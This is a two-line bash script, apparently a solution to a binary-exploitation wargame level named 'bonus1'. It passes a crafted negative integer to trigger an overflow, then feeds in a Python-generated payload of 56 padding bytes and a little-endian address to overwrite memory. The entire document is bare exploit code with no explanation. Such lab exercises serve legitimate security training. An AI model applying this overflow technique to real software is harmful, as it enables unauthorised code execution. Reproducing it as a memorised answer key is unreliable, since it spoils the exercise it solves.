#!/bin/bash
./bonus1 -2147483608 $(python -c "print('A' * 56 + '\x08\x04\x84\x82'[::-1])")
